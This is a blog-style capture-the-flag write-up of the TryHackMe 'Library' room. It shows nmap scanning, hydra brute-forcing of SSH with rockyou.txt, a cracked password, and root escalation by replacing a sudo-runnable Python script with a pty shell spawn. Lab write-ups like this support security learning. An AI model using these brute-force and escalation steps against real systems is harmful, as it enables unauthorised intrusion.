---
layout: post
title: "Library CTF Write-up"
date: 2024-09-30
link: https://tryhackme.com/room/bsidesgtlibrary
link_text: "Library CTF"
categories: ctf-writeups
---

The goal of this CTF challenge is to read two files: `user.txt` and `root.txt`.

---

We should start by scanning the target machine using **nmap**:

```bash
nmap -sV -p- -A [target machine IP] -oN "nmap_output.txt"
```

- **`-sV`**: Enables version detection
- **`-p-`**: Scans all ports
- **`-A`**: Displays additional information about the services
- Optionally, **`-oN`** stores the output in a text file

![Nmap scan output](/assets/writeup_assets/library-ctf-writeup/figure_1.png "Figure 1: Nmap scan output")
*Figure 1: Nmap scan output*

Nmap shows only two ports open: **22 (SSH)** and **80 (HTTP)**.

---

Let's attempt to connect via SSH:

```bash
ssh 10.10.21.50
```

![Initial SSH probe](/assets/writeup_assets/library-ctf-writeup/figure_2.png "Figure 2: Initial SSH probe")
*Figure 2: Initial SSH probe*

We need **root's password** to login, so for now, let's explore the **HTTP** service by opening the target IP in a browser.

```bash
http://10.10.21.50
```

![Initial HTTP probe](/assets/writeup_assets/library-ctf-writeup/figure_3.png "Figure 3: Initial HTTP probe")
*Figure 3: Initial HTTP probe*

We are greeted with a webpage that features a blog post by the user "meliodas". This is promising. Before we crack this password, let's do some due diligence and check for a **robots.txt** file.

```bash
http://10.10.21.50/robots.txt
```

![Robots.txt](/assets/writeup_assets/library-ctf-writeup/figure_4.png "Figure 4: Robots.txt")
*Figure 4: Robots.txt*

We can see "rockyou" listed on this page, which is likely a hint to use the famous **rockyou.txt** password list for cracking the password for "meliodas". Now, let’s break out **hydra** to try it out.

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.10.21.50
```

- **`-l`** signifies a user
- **`-P`** signifies a list of passwords

![Cracked password](/assets/writeup_assets/library-ctf-writeup/figure_5.png "Figure 5: Cracked password")
*Figure 5: Cracked password*

---

That was fairly simple. Let's login to "meliodas" via SSH.

```bash
ssh meliodas@10.10.21.50
```

Enter the password, **"iloveyou1"**, when prompted.

![User.txt](/assets/writeup_assets/library-ctf-writeup/figure_6.png "Figure 6: user.txt")
*Figure 6: user.txt*

We can easily display **user.txt**, which is our first flag.

---

Now, let’s try to escalate our privileges to find the root flag. A good starting point is to check what privileges we currently have.

```bash
sudo -l
```

![Sudo -l output](/assets/writeup_assets/library-ctf-writeup/figure_7.png "Figure 7: sudo -l output")
*Figure 7: sudo -l output*

We can run Python files, and there is a Python file called **bak.py** available. Let’s print out the file and try to run it.

![Bak.py initial investigation](/assets/writeup_assets/library-ctf-writeup/figure_8.png "Figure 8: bak.py initial investigation")
*Figure 8: bak.py initial investigation*

If we can edit this file, we can escalate our privileges. Let's check if we have edit permissions.

```bash
ls -l
```

![Permissions](/assets/writeup_assets/library-ctf-writeup/figure_9.png "Figure 9: Permissions")
*Figure 9: Permissions*

We do not have edit permissions. We can try to delete the file and then recreate it, giving us the permissions we need.

```bash
rm bak.py
touch bak.py
nano bak.py
```

Now, let's create our script:

```python
import pty; pty.spawn("/bin/bash")
```

Then run:

```bash
sudo python /home/meliodas/bak.py
```

And we are root! The root flag is located at **/root/root.txt**.

![Root.txt](/assets/writeup_assets/library-ctf-writeup/figure_10.png "Figure 10: root.txt")
*Figure 10: root.txt*

Congratulations! **Library CTF** has been completed!

